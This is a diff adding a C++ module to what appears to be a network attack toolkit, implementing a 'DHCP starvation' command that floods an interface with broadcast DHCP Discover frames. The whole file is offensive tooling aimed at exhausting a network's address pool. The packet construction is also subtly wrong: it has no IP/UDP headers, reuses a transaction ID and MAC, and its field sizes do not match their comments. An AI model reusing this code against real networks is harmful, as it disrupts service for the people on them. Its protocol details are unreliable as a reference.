@@ -1,0 +1,44 @@
+#include "layer7/dhcp.h"
+#include "core/socket.h"
+#include "core/utils.h"
+#include <iostream>
+#include <cstring>
+#include <thread>
+#include <chrono>
+#include <arpa/inet.h>
+#include <vector>
+namespace lemonade {
+void DHCP::starvation(const std::vector<std::string>& args) {
+    if(args.size()<1){ std::cerr<<"Usage: -dhcpstarve <interface>\n"; return; }
+    std::string iface=args[0];
+    RawSocket sock(iface);
+    if(!sock.open()){ std::cerr<<"socket failed\n"; return; }
+    uint8_t broadcast[6]={0xff,0xff,0xff,0xff,0xff,0xff};
+    for(int i=0;i<1000;i++){
+        std::vector<uint8_t> frame(14+300);
+        memcpy(frame.data(), broadcast,6);
+        memcpy(frame.data()+6, sock.get_mac(),6);
+        frame[12]=0x08; frame[13]=0x00;
+        // DHCP discover packet (simplified)
+        unsigned char dhcp[] = {
+            0x01,0x01,0x06,0x00, // op, htype, hlen, hops
+            0x12,0x34,0x56,0x78, // xid
+            0x00,0x00,0x00,0x00, // secs, flags
+            0x00,0x00,0x00,0x00, // ciaddr
+            0x00,0x00,0x00,0x00, // yiaddr
+            0x00,0x00,0x00,0x00, // siaddr
+            0x00,0x00,0x00,0x00, // giaddr
+            0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00, // chaddr (16)
+            0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00, // sname (64)
+            0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00, // file (128)
+            0x63,0x82,0x53,0x63, // magic cookie
+            0x35,0x01,0x01, // DHCP discover
+            0xff // end
+        };
+        memcpy(frame.data()+14, dhcp, sizeof(dhcp));
+        sock.send(frame);
+        std::this_thread::sleep_for(std::chrono::milliseconds(10));
+    }
+    std::cout<<"DHCP starvation attack finished\n";
+}
+}
